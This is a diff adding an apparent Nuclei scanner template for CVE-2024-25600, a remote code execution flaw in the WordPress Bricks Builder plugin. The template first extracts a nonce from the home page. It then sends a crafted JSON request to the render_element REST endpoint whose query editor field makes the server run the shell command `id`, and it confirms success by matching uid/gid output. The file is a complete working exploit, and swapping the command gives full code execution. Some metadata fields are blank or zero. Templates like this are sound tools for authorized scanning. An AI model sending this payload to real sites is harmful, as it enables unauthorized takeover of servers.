@@ -1,0 +1,55 @@
+id: wordpress_bricks_builder_rce_cve_2024_25600
+info:
+  name: Wordpress Bricks Builder Rce (CVE-2024-25600)
+  author: Yueji0j1anke
+  severity: high
+  description: ''
+  reference: []
+  classification:
+    cvss-metrics: ''
+    cvss-score: 0.0
+    cve-id: ''
+    cwe-id: ''
+  tags: ''
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+
+      - |
+        POST /wp-json/bricks/v1/render_element HTTP/1.1
+        Content-Type: application/json
+
+        {
+          "postId": "1",
+          "nonce": "{{nonce_value}}",
+          "element": {
+            "name": "container",
+            "settings": {
+              "hasLoop": "true",
+              "query": {
+                "useQueryEditor": true,
+                "queryEditor": "throw new Exception(`id`);",
+                "objectType": "post"
+              }
+            }
+          }
+        }
+        
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: nonce_value
+        part: body
+        group: 1
+        regex:
+          - 'nonce":"([0-9a-z]+)'
+        internal: true
